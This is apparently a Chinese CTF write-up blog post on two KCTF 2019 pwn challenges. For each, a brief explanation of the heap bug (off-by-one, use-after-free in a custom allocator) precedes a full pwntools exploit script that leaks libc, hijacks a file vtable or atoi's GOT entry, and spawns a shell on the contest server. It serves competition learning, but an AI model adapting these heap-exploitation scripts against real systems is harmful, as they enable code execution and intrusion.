---
title: KCTF 2019 Q3
categories: 
- KCTF2019
---
# KCTF2019 Q3

## 前言

看雪的比赛，第三赛季，后面俩pwn好像是kernel的，打扰了，做了第一个pwn就忙项目去了，第二个等今天放wp之后看着大佬的学了一下

## pwn1

### 漏洞利用

程序有off-by-one，libc是2.23，出题人自己写了个malloc_hook，每次malloc的时候都会重写malloc_hook，因此覆写不可行，没有show，这个还是爆破该stdout，给了heap地址，最后构造fake vtable劫持文件控制流。

### exp.py

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
elf = ELF('./pwn')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
def Add(p,size):
    p.recvuntil('>>')
    p.sendline('1')
    p.recvuntil("size : ")
    p.sendline(str(size))

def Delete(p,idx):
    p.recvuntil('>>')
    p.sendline('2')
    p.recvuntil("idx : ")
    p.sendline(str(idx))

def Edit(p,idx,text):
    p.recvuntil('>>')
    p.sendline('3')
    p.recvuntil("idx : ")
    p.sendline(str(idx))
    p.recvuntil('text : ')
    p.send(text)

def exp(p):
    #leak libc
    Add(p,0xf8)#0
    p.recvuntil('0x')
    heapbase = int(p.recvline().strip('\n'),16) - 0x10
    log.success('heap base => ' + hex(heapbase))
    Add(p,0x68)#1
    Add(p,0x68)#2
    Add(p,0xf8)#3
    Add(p,0x68)#4
    Delete(p,0)
    Delete(p,1)
    Edit(p,2,'a'*0x60+p64(0x170+0x70))
    Delete(p,3)
    #
    Add(p,0xf8)#0
    Add(p,0x58)#1
    Edit(p,1,'\xdd\x25\n')
    Add(p,0x78)#3
    Add(p,0xf8)#5
    Delete(p,0)
    Edit(p,3,'a'*0x70+p64(0x1e0))
    Delete(p,5)
    Add(p,0xf8-0x10)#0
    Add(p,0x58)#5
    Edit(p,5,p64(0)+p64(0x71)+'\n')
    Add(p,0x68)#6
    Add(p,0x68)#7 target
    Edit(p,7,'\x00'*0x33+p64(0xfbad1800)+p64(0)*3+'\x00\n')
    p.recvn(0x40)
    libc_base = u64(p.recv(8))- (0x7ffff7dd2600-0x7ffff7a0d000)
    log.success('libc base => ' + hex(libc_base))
    fake_chunk = libc_base + libc.symbols['__malloc_hook'] - 0x23
    #fake_chunk = libc_base + 0x3c4b0d
    shell_addr = libc_base + gadgets[0]
    #get shell
    #Add(p,0x88)#8
    #Add(p,0xf8)#9
    #Delete(p,0)
    #Edit(p,8,'a'*0x10+p64(0x71)+p64(0x71)+'a'*0x60+p64(0x1e0))
    #Delete(p,9)
    #Delete(p,8)
    #spare some space
    Delete(p,5)
    #go on
    Edit(p,4,p64(libc_base+libc.symbols['system'])*0xc+'\n')
    fake_heap = heapbase + 0x2f0

    #chunk1 == chunk6
    Add(p,0x100)#5
    Edit(p,5,'a'*0x10+p64(2)+p64(3)+'\x00'*0xa8+p64(fake_heap)+'\n')
    Delete(p,5)
    #
    payload = 'a'*0x40+"/bin/sh\x00"+p64(0x61)+p64(0)+p64(libc_base+0x3c5520-0x10)
    Edit(p,6,payload+'\n')
    #gdb.attach(p)
    Add(p,0x1)

    p.interactive()

#p = process('./pwn')
#exp(p)
if __name__ == '__main__':
    debug = 0
    while True:
        if debug:
            libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
            p = process('./pwn')
        else:
            libc = ELF('./libc-2.23.so')
            p = remote('154.8.174.214',10001)
        try:
            exp(p)
            p.interactive()
            p.close()
        except Exception,e:
            p.close()
```

## 0xbird

### 前言

出题人自己实现的malloc和hook，这种题第二次见到，只是这次的逻辑更为复杂，直接劝退了，出了wp再看感觉自己真太菜了，稍微看看其实就能搞出来的。

### 漏洞利用

漏洞在于Free之后的UAF，每个chunk的后两个8字节分别为next和prev，每次Malloc的时候根据0x602558找最近释放的块，再用prev指针找下一个空闲块，分配的时候有一个size的check，我们用UAF分配到chk_lis上面的stdout(size:0x7f)，劫持chk_list再Edit为atoi@got，最后覆写为shellcode_addr.

### exp.py

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 0
elf = ELF('./0xbird1')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
if debug:
    p = process('./0xbird1')
else:
    p = remote('154.8.174.214',10000)

def Alloc(size):
    p.recvuntil('2019KCTF| ')
    p.sendline('A')
    p.recvuntil("Size: ")
    p.sendline(str(size))

def Free(index):
    p.recvuntil('2019KCTF| ')
    p.sendline('F')
    p.recvuntil('0x')
    data = p.recvuntil(' ',drop=True)
    p.recvuntil("Index: ")
    p.sendline(str(index))

def Write(index,content,leak=False):
    p.recvuntil('2019KCTF| ')
    p.sendline('W')
    addr = 0
    if leak:
        p.recvuntil(") 0x",drop=True)
        addr = int(p.recvuntil(" ",drop=True),16)
    p.recvuntil('Write addr: ')
    p.sendline(str(index))
    p.recvuntil("Write value: ")
    p.send(content)
    return addr

def Nice():
    p.recvuntil('2019KCTF| ')
    p.sendline('N')

def exp():
    #leak libc
    #for i in range(0xf):
    #    Alloc(0x20+i)#1
    #Alloc(0x1000)
    sc = asm(shellcraft.amd64.linux.sh())
    Alloc(0x68)#1
    sc_addr = Write(1,sc,True)
    log.success("sc addr => " + hex(sc_addr))
    Alloc(0x68)#2
    Alloc(0x68)#3
    Alloc(0x68)#4
    Alloc(0x68)#5
    Alloc(0x68)#6
    Alloc(0x68)#7
    Free(2)
    Free(3)
    Free(4)
    #
    Write(4,'\x00'*0x58+p64(0x602095)*2)
    Alloc(0x68)#8
    Alloc(0x68)#9 fake
    Write(9,'\x00'*3+p64(elf.got['atoi']))
    Write(1,p64(sc_addr))
    #gdb.attach(p)
    p.recvuntil("2019KCTF| ")
    p.sendline("F")
    p.recvuntil("Index: ")
    p.send("/bin/sh\x00")

    p.interactive()

exp()
```
